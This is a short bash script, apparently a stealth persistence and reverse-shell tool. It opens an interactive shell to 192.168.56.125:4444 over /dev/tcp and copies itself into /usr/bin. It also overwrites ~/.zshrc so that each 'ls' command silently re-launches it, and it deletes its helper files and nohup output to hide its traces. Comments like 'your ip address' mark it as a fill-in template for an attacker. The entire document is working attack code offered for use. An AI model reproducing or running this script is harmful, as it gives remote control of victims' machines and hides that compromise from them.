#!/bin/bash
sudo cp $0 /usr/bin/stealthshell.sh 2>/dev/null
echo "#!/bin/bash" > shell
echo "bash -i >& /dev/tcp/192.168.56.125/4444 0>&1" >> shell #your ip address
chmod +x shell 
sudo nohup ./shell >/dev/null 2>&1 &
echo "sudo rm nohup.out" > remove
cp ~/.zshrc ~/.zshrc.bak
echo 'export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin"' > ~/.zshrc
echo 'source /etc/profile' >> ~/.zshrc
echo "PS1='%F{blue}%n@%m:%~%# %f'" >> ~/.zshrc
echo 'function ls { /bin/ls "$@" && /usr/bin/stealthshell.sh; }' >> ~/.zshrc #your shell type
source ~/.zshrc 2 > /dev/null
chmod +x remove
sudo ./remove 2>/dev/null
rm remove
rm shell
